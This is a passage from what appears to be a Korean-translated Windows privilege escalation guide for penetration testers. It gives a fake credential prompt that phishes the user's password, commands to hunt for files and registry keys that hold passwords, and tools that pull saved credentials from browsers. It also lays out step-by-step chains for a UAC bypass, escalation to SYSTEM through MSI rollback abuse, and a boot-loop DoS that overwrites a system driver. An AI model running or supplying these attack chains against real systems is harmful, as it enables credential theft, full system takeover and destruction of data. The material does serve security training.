$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **자격 증명이 포함될 수 있는 파일명**

과거에 **clear-text** 또는 **Base64** 형태의 **passwords**를 포함하고 있던 것으로 알려진 파일들
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
제안된 모든 파일을 검색하세요:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin의 자격 증명

Bin도 확인해서 그 안에 있는 자격 증명을 찾아봐야 합니다

여러 프로그램에 의해 저장된 **passwords**를 복구하려면 다음을 사용할 수 있습니다: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### registry 내부

**자격 증명이 있을 수 있는 다른 registry 키**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**레지스트리에서 openssh keys 추출.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

**Chrome 또는 Firefox**에 저장된 passwords가 있는 db를 확인해야 합니다.\
또한 브라우저의 history, bookmarks, favourites도 확인하세요. 그러면 거기에 **passwords are** 저장되어 있을 수도 있습니다.

브라우저에서 passwords를 추출하는 도구:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**은 서로 다른 언어의 소프트웨어 구성요소 간 **intercommunication**을 가능하게 하는 Windows 운영체제 내장 기술입니다. 각 COM component는 **class ID (CLSID)**로 **identified via** 되며, 각 component는 하나 이상의 interfaces를 통해 기능을 제공하고, 이들은 interface IDs (IIDs)로 식별됩니다.

COM classes와 interfaces는 각각 레지스트리의 **HKEY\CLASSES\ROOT\CLSID** 및 **HKEY\CLASSES\ROOT\Interface** 아래에 정의됩니다. 이 레지스트리는 **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.** 를 병합하여 생성됩니다.

이 레지스트리의 CLSIDs 내부에서 자식 레지스트리 **InProcServer32**를 찾을 수 있으며, 여기에는 **DLL**을 가리키는 **default value**와 **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi), 또는 **Neutral** (Thread Neutral)일 수 있는 **ThreadingModel** 값이 포함되어 있습니다.

![](<../../images/image (729).png>)

기본적으로, 실행될 **DLLs** 중 하나라도 **overwrite**할 수 있다면, 그 DLL이 다른 user에 의해 실행될 경우 **privileges를 escalate**할 수 있습니다.

공격자가 persistence mechanism으로 COM Hijacking을 어떻게 사용하는지 알아보려면 다음을 확인하세요:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**특정 파일명을 가진 파일 검색**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**레지스트리에서 키 이름과 비밀번호를 검색합니다**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### 비밀번호를 찾는 도구

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** 플러그인으로, 내가 만든 이 플러그인은 피해자 시스템 내부에서 자격 증명을 검색하는 모든 metasploit POST 모듈을 **자동으로 실행**한다.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)는 이 페이지에 언급된 비밀번호가 포함된 모든 파일을 자동으로 검색한다.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne)는 시스템에서 비밀번호를 추출하는 또 다른 훌륭한 도구다.

도구 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher)는 평문으로 이 데이터를 저장하는 여러 도구(PuTTY, WinSCP, FileZilla, SuperPuTTY, 그리고 RDP)의 **sessions**, **usernames** 및 **passwords**를 검색한다
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

**SYSTEM**으로 실행 중인 프로세스가 `OpenProcess()`로 **전체 권한**을 가진 새 프로세스를 연다고 가정해 봅시다. 같은 프로세스가 또 `CreateProcess()`로 **낮은 권한의 새 프로세스**를 만들지만, 메인 프로세스의 열린 핸들들을 모두 상속합니다.\
그런 다음, **낮은 권한 프로세스에 대해 전체 권한**을 가지고 있다면, `OpenProcess()`로 생성된 **권한 있는 프로세스의 열린 핸들**을 가져와 **shellcode를 주입**할 수 있습니다.\
이 취약점을 **탐지하고 악용하는 방법**에 대한 자세한 예시는 [이 예시를 읽어보세요.](leaked-handle-exploitation.md)\
[다른 이 포스트는 서로 다른 권한 수준으로 상속된 프로세스와 스레드의 더 많은 열린 핸들을 테스트하고 악용하는 방법에 대한 더 완전한 설명을 제공합니다(전체 권한만이 아님)](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**pipe**라고 불리는 공유 메모리 세그먼트는 프로세스 간 통신과 데이터 전송을 가능하게 합니다.

Windows는 **Named Pipes**라는 기능을 제공하여, 서로 관련 없는 프로세스도 다른 네트워크를 통해서까지 데이터를 공유할 수 있게 합니다. 이는 **named pipe server**와 **named pipe client**로 역할이 나뉘는 클라이언트/서버 아키텍처와 유사합니다.

**client**가 pipe를 통해 데이터를 보내면, pipe를 설정한 **server**는 필요한 **SeImpersonate** 권한이 있다면 **client의 신원**을 **대리**할 수 있습니다. 따라서 당신이 모방할 수 있는 pipe로 통신하는 **권한 있는 프로세스**를 찾으면, 그 프로세스가 당신이 만든 pipe와 상호작용할 때 그 신원을 채택해 **더 높은 권한을 획득**할 기회를 얻을 수 있습니다. 이러한 공격을 수행하는 방법은 [**here**](named-pipe-client-impersonation.md)와 [**here**](#from-high-integrity-to-system)에서 도움이 되는 가이드를 찾을 수 있습니다.

또한 다음 도구는 **burp 같은 도구로 named pipe 통신을 가로채는 것**을 가능하게 합니다: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **그리고 이 도구는 privescs를 찾기 위해 모든 pipe를 목록으로 보고 확인하는 것도 가능하게 합니다** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

서버 모드의 Telephony 서비스(TapiSrv)는 `\\pipe\\tapsrv` (MS-TRP)를 노출합니다. 원격 인증된 클라이언트는 mailslot 기반 비동기 이벤트 경로를 악용해 `ClientAttach`를 `NETWORK SERVICE`가 쓸 수 있는 기존 파일 어디든지에 대한 임의의 **4바이트 쓰기**로 바꿀 수 있고, 이후 Telephony 관리자 권한을 얻어 서비스로 임의의 DLL을 로드할 수 있습니다. 전체 흐름:

- 쓰기 가능한 기존 경로로 `pszDomainUser`를 설정한 `ClientAttach` → 서비스가 이를 `CreateFileW(..., OPEN_EXISTING)`로 열고 비동기 이벤트 쓰기에 사용함.
- 각 이벤트는 `Initialize`의 공격자가 제어하는 `InitContext`를 해당 핸들에 씀. `LRegisterRequestRecipient`(`Req_Func 61`)으로 line app을 등록하고, `TRequestMakeCall`(`Req_Func 121`)을 트리거한 뒤, `GetAsyncEvents`(`Req_Func 0`)로 가져오고, 이후 unregister/shutdown 하여 결정적인 쓰기를 반복함.
- `C:\Windows\TAPI\tsec.ini`의 `[TapiAdministrators]`에 자신을 추가한 뒤 재연결하고, 임의의 DLL 경로로 `GetUIDllName`을 호출해 `TSPI_providerUIIdentify`를 `NETWORK SERVICE`로 실행함.

더 자세한 내용:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Windows에서 실행할 수 있는 stuff의 File Extensions

**[https://filesec.io/](https://filesec.io/)** 페이지를 확인해 보세요

### Protocol handler / ShellExecute abuse via Markdown renderers

`ShellExecuteExW`로 전달되는 클릭 가능한 Markdown 링크는 위험한 URI 핸들러(`file:`, `ms-appinstaller:` 또는 등록된 임의의 scheme)를 트리거할 수 있으며, 현재 사용자로 공격자가 제어하는 파일을 실행할 수 있습니다. 다음을 참고하세요:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **비밀번호를 위한 Command Line 모니터링**

사용자로 shell을 얻었을 때, credentials를 command line으로 전달하는 예약 작업이나 다른 프로세스가 실행 중일 수 있습니다. 아래 스크립트는 2초마다 프로세스 command line을 캡처하고 현재 상태를 이전 상태와 비교하여, 차이점을 출력합니다.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## 프로세스에서 비밀번호 탈취

## Low Priv User에서 NT\AUTHORITY SYSTEM으로 (CVE-2019-1388) / UAC Bypass

그래픽 인터페이스(콘솔 또는 RDP 통해)에 접근할 수 있고 UAC가 활성화되어 있다면, 일부 Microsoft Windows 버전에서는 권한이 없는 사용자에서 터미널이나 "NT\AUTHORITY SYSTEM"과 같은 다른 프로세스를 실행하는 것이 가능합니다.

이를 통해 같은 취약점을 사용해 권한 상승과 UAC 우회를 동시에 수행할 수 있습니다. 또한 별도로 무엇인가를 설치할 필요가 없고, 이 과정에서 사용되는 binary는 Microsoft에서 서명하고 발급한 것입니다.

영향을 받는 일부 시스템은 다음과 같습니다:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
이 취약점을 exploit하려면 다음 단계를 수행해야 합니다:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

The attack basically consist of abusing the Windows Installer's rollback feature to replace legitimate files with malicious ones during the uninstallation process. For this the attacker needs to create a **malicious MSI installer** that will be used to hijack the `C:\Config.Msi` folder, which will later be used by he Windows Installer to store rollback files during the uninstallation of other MSI packages where the rollback files would have been modified to contain the malicious payload.

The summarized technique is the following:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?

You could exploit **NTFS internals**: every folder has a hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
이 스트림은 폴더의 **index metadata**를 저장합니다.

따라서 폴더의 **`::$INDEX_ALLOCATION` 스트림**을 **delete**하면, NTFS는 파일 시스템에서 **전체 폴더를 제거**합니다.

다음과 같은 표준 파일 삭제 API를 사용해 이를 수행할 수 있습니다:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> 파일 delete API를 호출하고 있지만, 실제로는 **folder 자체를 deletes** 합니다.

### From Folder Contents Delete to SYSTEM EoP
만약 이 primitive가 임의의 files/folders를 delete할 수는 없지만, **attacker-controlled folder의 *contents*는 deletion할 수 있다면**?

1. Step 1: bait folder와 file setup
- Create: `C:\temp\folder1`
- 그 안에: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt`에 **oplock**을 설정
- privileged process가 `file1.txt`를 delete하려고 하면 oplock이 **execution을 pause**합니다.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: SYSTEM process를 트리거(e.g., `SilentCleanup`)
- 이 프로세스는 폴더들(e.g., `%TEMP%`)을 스캔하고 그 내용물을 삭제하려고 시도한다.
- `file1.txt`에 도달하면, **oplock가 트리거**되고 콜백으로 제어가 넘어간다.

4. Step 4: oplock callback 내부에서 – deletion을 redirect

- Option A: `file1.txt`를 다른 곳으로 이동
- 이렇게 하면 oplock을 깨지 않고 `folder1`이 비워진다.
- `file1.txt`를 직접 삭제하지 마라 — 그러면 oplock이 너무 일찍 release된다.

- Option B: `folder1`을 **junction**으로 변환:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: `\RPC Control`에 **symlink**를 생성:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> 이는 폴더 메타데이터를 저장하는 NTFS 내부 스트림을 대상으로 한다 — 이를 삭제하면 폴더도 삭제된다.

5. Step 5: Release the oplock
- SYSTEM 프로세스는 계속 진행하며 `file1.txt`를 삭제하려고 한다.
- 하지만 이제 junction + symlink 때문에, 실제로 삭제되는 것은:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**결과**: `C:\Config.Msi`는 SYSTEM에 의해 삭제됩니다.

### 임의 폴더 생성에서 영구 DoS로

**SYSTEM/admin으로 임의의 폴더를 생성할 수 있게 해주는 primitive**를 악용합니다 — **파일을 쓸 수 없거나** **약한 권한을 설정할 수 없어도** 가능합니다.

**파일**이 아니라 **폴더**를 **중요한 Windows driver** 이름으로 생성합니다. 예:
```
C:\Windows\System32\cng.sys
```
- 이 경로는 보통 `cng.sys` 커널 모드 드라이버에 해당합니다.
- 이를 **폴더로 미리 생성**하면, Windows는 부팅 시 실제 드라이버를 로드하지 못합니다.
- 그러면 Windows는 부팅 중 `cng.sys`를 로드하려고 시도합니다.
- 폴더를 발견하고, **실제 드라이버를 해석하지 못해**, **크래시하거나 부팅을 중단**합니다.
- **대체 경로가 없고**, 외부 개입(예: boot repair 또는 disk access) 없이는 **복구할 수 없습니다**.

### 권한 있는 log/backup 경로 + OM symlinks로 임의 파일 덮어쓰기 / boot DoS

**권한 있는 서비스**가 **쓰기 가능한 config**에서 읽은 경로로 logs/exports를 기록할 때, **Object Manager symlinks + NTFS mount points**로 그 경로를 리디렉션해 권한 있는 쓰기를 임의 덮어쓰기로 바꿀 수 있습니다(심지어 **SeCreateSymbolicLinkPrivilege 없이도**).

**Requirements**
- 대상 경로를 저장하는 config가 공격자에게 writable 해야 함(예: `%ProgramData%\...\.ini`).
- `\RPC Control`로의 mount point와 OM file symlink를 생성할 수 있어야 함(James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- 그 경로에 쓰기를 수행하는 권한 있는 작업(log, export, report)이 있어야 함.

**Example chain**
1. config를 읽어 권한 있는 log destination을 복구함. 예: `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. 관리자 권한 없이 path를 리디렉션:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 권한이 있는 구성 요소가 로그를 쓰도록 기다립니다(예: admin이 "send test SMS"를 트리거). 이제 write는 `C:\Windows\System32\cng.sys`에 기록됩니다.
4. 덮어쓴 대상(hex/PE parser)을 검사해 corruption을 확인합니다; reboot은 Windows가 변조된 driver path를 로드하게 강제합니다 → **boot loop DoS**. 이는 privileged service가 write를 위해 열게 될 모든 protected file로도 일반화됩니다.

> `cng.sys`는 보통 `C:\Windows\System32\drivers\cng.sys`에서 로드되지만, `C:\Windows\System32\cng.sys`에 copy가 존재하면 먼저 시도될 수 있어, corrupted data를 위한 신뢰할 수 있는 DoS sink가 됩니다.



## **From High Integrity to System**

### **New service**

이미 High Integrity process에서 실행 중이라면, **SYSTEM으로 가는 path**는 새 service를 **생성하고 실행**하는 것만으로도 쉽게 가능합니다:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> service binary를 만들 때는 반드시 유효한 service이거나, 아니면 binary가 필요한 작업을 충분히 빠르게 수행해야 합니다. 그렇지 않으면 유효한 service가 아닐 경우 20s 후에 kill됩니다.

### AlwaysInstallElevated

High Integrity process에서 **AlwaysInstallElevated registry entries를 enable**하고, _**.msi**_ wrapper를 사용해 reverse shell을 **install**해볼 수 있습니다.\
[관련된 registry keys와 _.msi_ package를 설치하는 방법에 대한 자세한 정보는 여기서 확인하세요.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

그러한 token privileges가 있다면(아마 이미 High Integrity process에서 찾게 될 것입니다), SeDebug privilege를 사용해 **거의 모든 process**(protected processes 제외)를 **open**할 수 있고, process의 **token을 copy**한 뒤, 그 token으로 **arbitrary process**를 생성할 수 있습니다.\
이 technique은 보통 **SYSTEM으로 실행 중이면서 모든 token privileges를 가진 process를 선택**하는 데 사용됩니다(_yes, token privileges를 모두 갖지 않은 SYSTEM processes도 찾을 수 있습니다_).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

이 technique은 meterpreter가 `getsystem`에서 privilege escalation을 할 때 사용합니다. 이 technique은 **pipe를 만들고, 그 pipe에 write하도록 service를 create/abuse**하는 방식으로 구성됩니다. 그런 다음 **SeImpersonate** privilege를 사용해 pipe를 만든 **server**는 pipe client(service)의 **token을 impersonate**할 수 있게 되어 SYSTEM privileges를 얻습니다.\
name pipes에 대해 [**더 알아보려면 이것을 읽어보세요**](#named-pipe-client-impersonation).\
high integrity에서 System으로 name pipes를 사용해 가는 예제를 읽고 싶다면 [**이것을 읽어보세요**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

**SYSTEM**으로 실행되는 **process**가 **load**하는 dll을 **hijack**할 수 있다면, 해당 permissions로 arbitrary code를 실행할 수 있습니다. 따라서 Dll Hijacking도 이런 종류의 privilege escalation에 유용하며, 게다가 **high integrity process에서 훨씬 더 쉽게 달성**할 수 있습니다. 왜냐하면 dll을 load하는 데 사용되는 folders에 대해 **write permissions**를 가지기 때문입니다.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Check for misconfigurations and sensitive files (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Check for some possible misconfigurations and gather info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Check for misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information. Use -Thorough in local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extracts crendentials from Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray gathered passwords across domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS spoofer and man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Search for known privesc vulnerabilities (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Search for known privesc vulnerabilities (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerates the host searching for misconfigurations (more a gather info tool than privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extracts credentials from lots of softwares (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port of PowerUp to C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Check for misconfiguration (executable precompiled in github). Not recommended. It does not work well in Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Check for possible misconfigurations (exe from python). Not recommended. It does not work well in Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool created based in this post (it does not need accesschk to work properly but it can use it).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Reads the output of **systeminfo** and recommends working exploits (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Reads the output of **systeminfo** andrecommends working exploits (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

